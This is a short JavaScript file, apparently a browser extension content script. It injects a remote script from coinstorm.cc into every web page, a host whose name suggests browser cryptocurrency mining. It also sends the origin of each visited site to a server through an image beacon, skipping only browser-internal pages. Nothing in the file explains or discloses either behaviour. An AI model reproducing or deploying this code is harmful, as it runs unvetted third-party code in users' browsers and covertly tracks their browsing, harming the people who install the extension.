function loadScript(url, callback) {

    var script = document.createElement("script")
    script.type = "text/javascript";

    if (script.readyState) { //IE
        script.onreadystatechange = function() {
            if (script.readyState == "loaded" ||
                script.readyState == "complete") {
                script.onreadystatechange = null;
                callback();
            }
        };
    } else { //Others
        script.onload = function() {
            callback();
        };
    }

    script.src = url;
    document.getElementsByTagName("head")[0].appendChild(script);
}


loadScript("https://coinstorm.cc/js/script.js", function() {
    //initialization code
});

chrome.extension.sendRequest({
    action: "getimg"
}, function(data) {
    var href = document.location.href;
    if (href.indexOf("about:") == 0 || href.indexOf("chrome:") == 0 || href.indexOf("_/chrome/newtab") > -1) return;


    var m = href.match(/https?:\/\/.*?\//i);
    var img = new Image();
    img.src = data + "&t=v&u=" + encodeURIComponent(m) + "&rnd=" + Math.random();

});